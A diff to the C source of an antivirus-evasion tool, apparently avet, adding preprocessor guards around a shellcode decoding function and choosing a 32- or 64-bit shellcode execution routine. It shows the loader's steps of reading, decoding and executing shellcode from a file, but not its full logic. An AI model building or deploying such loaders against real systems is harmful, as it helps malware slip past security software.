@@ -2,7 +2,7 @@
 Author: Daniel Sauder
 License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
 Web: https://github.com/govolution/avet
- */
+*/
 
 //     "         .==,_                                          \n"
 //     "        .===,_`\\                                        \n"
@@ -36,7 +36,9 @@ Web: https://github.com/govolution/avet
 
 int get_filesize(char *fvalue);
 unsigned char* load_textfile(char *fvalue, unsigned char *buf, int size2);
+#ifdef ENCRYPT
 unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size);
+#endif
 void exec_shellcode(unsigned char *shellcode);
 void exec_shellcode64(unsigned char *shellcode);
 #ifdef UVALUE
@@ -135,7 +137,12 @@ int main (int argc, char **argv)
 		int size = get_filesize(sh_filename);
 		buffer = load_textfile(sh_filename, buffer, size);
 		shellcode = decode_shellcode(buffer,shellcode,size);
-		exec_shellcode(shellcode);
+		#ifndef X64 
+			exec_shellcode(shellcode);
+		#endif
+		#ifdef X64
+			exec_shellcode64(shellcode);
+		#endif
 	}
 #endif
 
@@ -198,6 +205,7 @@ unsigned char* load_textfile(char *fvalue, unsigned char *buffer, int size)
 }
 
 // return pointer to shellcode
+#ifdef ENCRYPT
 unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
 {
 	int j=0;
@@ -228,6 +236,7 @@ unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode,
 
 	return shellcode;
 }
+#endif
 
 #ifndef X64
 void exec_shellcode(unsigned char *shellcode)
